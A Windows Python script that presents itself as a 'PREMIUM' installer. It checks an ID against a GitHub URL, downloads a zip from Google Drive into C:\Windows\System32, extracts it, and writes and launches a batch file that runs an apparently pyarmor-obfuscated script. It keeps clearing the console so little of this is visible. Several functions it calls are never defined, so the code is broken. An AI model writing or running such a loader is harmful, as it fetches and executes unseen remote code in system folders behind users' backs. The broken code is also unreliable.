import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')
dcnmwxdr = r'C:\Windows\System32\HLTN'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

result = check_string_in_url("https://raw.githubusercontent.com/elaidacruzsdfsdklxkou/installer/refs/heads/main/uniqueid_3.0.txt", file_contentsx1)
os.system('cls')
print("")
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\HLTN\aespr-jan-10-2025.py"
    files_to_delete = [
        r"C:\Windows\System32\MSX\aespr_v3.py",
        r"C:\Windows\System32\MSX\aespremium_nogui.bat",
        r"C:\Windows\System32\MSX\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("PREMIUM is updating, please don't close the window.")
                    print("")
                    print("")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\HLTN\\aespr-jan-10-2025.py"):
    print("")
    print("")
    print("")
    print("> INSTALLING PREMIUM...PLEASE WAIT...")
    print("")
    print("")
    print("")
    print("> INSTALLING PREMIUM...PLEASE WAIT...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1_A3LtJpv7Yd6we8Ni4pBX_dzlDZr1qpl", "C:\\Windows\\System32\\HLTN\\prjan.zip")
    zip_file = r'C:\Windows\System32\HLTN\prjan.zip'
    extract_dir = r'C:\Windows\System32\HLTN'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil
os.system('cls')
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")

os.system('cls')
def create_batch_file(python_command, script_name):
    directory = r"C:\Windows\System32\HLTN"
    filename = "aespremium_nogui.bat"
    filepath = os.path.join(directory, filename)
    if not os.path.exists(filepath):
        batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
        os.makedirs(directory, exist_ok=True)
        with open(filepath, 'w') as file:
            file.write(batch_content)
        print(f"")
    else:
        print("")

create_batch_file("py -3.11", r"C:\Windows\System32\HLTN\aespr-jan-10-2025.py")
batch_file_path = r"C:\Windows\System32\HLTN\aespremium_nogui.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")
os.system('cls')

os._exit(0)
sys.exit()
